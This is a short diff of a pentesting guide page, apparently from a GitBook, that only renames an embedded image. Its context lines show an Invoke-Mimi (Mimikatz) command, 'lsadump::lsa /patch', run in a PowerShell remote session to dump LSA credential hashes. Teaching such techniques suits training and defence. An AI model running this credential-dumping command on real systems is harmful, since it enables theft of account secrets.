@@ -123,7 +123,7 @@ Enter-PSSession $sess
  Invoke-Mimi -Command '"lsadump::lsa /patch"'
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 And just like that we are able to dump the hashes
 
